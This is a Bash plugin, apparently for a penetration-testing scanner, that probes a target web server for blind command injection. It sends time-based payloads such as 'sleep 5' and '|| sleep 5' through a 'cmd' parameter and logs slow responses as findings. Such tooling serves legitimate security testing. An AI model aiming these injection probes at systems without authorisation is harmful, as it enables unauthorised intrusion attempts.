PLUGIN_NAME="cmdi-payloads"

plugin_init() {
  return 0
}

plugin_run() {
  local target="$1"
  local port="${2:-80}"
  local outdir="$LOOT_DIR/vulnerabilities/command-exec"
  mkdir -p "$outdir"
  local outfile="$outdir/cmdi-payloads-$target.txt"

  echo "Testing blind/time-based command injection on $target:$port" > "$outfile"
  for payload in "sleep 5" "ping -c 5 127.0.0.1" "|| sleep 5"; do
    local start end elapsed
    start=$(date +%s%N)
    curl -s -m 10 "http://$target:$port/?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")" >/dev/null 2>&1 || true
    end=$(date +%s%N)
    elapsed=$(( (end - start) / 1000000 ))
    if [[ $elapsed -gt 4000 ]]; then
      echo "[!] Time-based injection detected: '$payload' responded in ${elapsed}ms" >> "$outfile"
      sniper_findings_add "$target" "blind-command-injection" "HIGH" "cmdi-payloads" "Time-based payload '$payload' responded in ${elapsed}ms"
    fi
  done
}

plugin_parse_output() {
  local result_file="$1"
  [[ -f "$result_file" ]] && grep -E "\[!\]" "$result_file" || true
}
